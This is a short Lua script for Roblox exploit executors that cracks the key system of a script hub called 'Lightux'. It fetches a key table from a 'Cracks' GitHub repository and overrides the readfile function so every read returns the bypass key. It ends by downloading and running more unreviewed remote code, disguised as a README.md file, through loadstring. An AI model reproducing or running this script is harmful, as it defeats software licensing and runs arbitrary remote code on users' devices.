local OnMobile = game:GetService("UserInputService").TouchEnabled
local OnLaptop = game:GetService("UserInputService").KeyboardEnabled
local Keys = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheHanki/Cracks/main/Lightux/V1.5/LightuxKeys.lua"))()
bypasskey = ""

-- quick bypass

function key(keyy)
	for i, v in pairs(Keys) do
		if keyy == i then
			return v
		end
	end
end

if OnMobile then
	--Dont try this unless youre on mobile
	bypasskey = key("Mobile")
elseif OnLaptop then	
	--Dont try this unless youre on pc
	bypasskey = key("Pc")
end

local originalReadFile = readfile
readfile = function(path)
	print("Bypassed by Hanki and Alex!")
	return bypasskey
end

-- BROOO THEIR LIGHTNING BACKGROUND SUCKS. IT FILLS FULL SCREEN
-- Lightux game detection sucks my ass
-- Skid Loader
loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
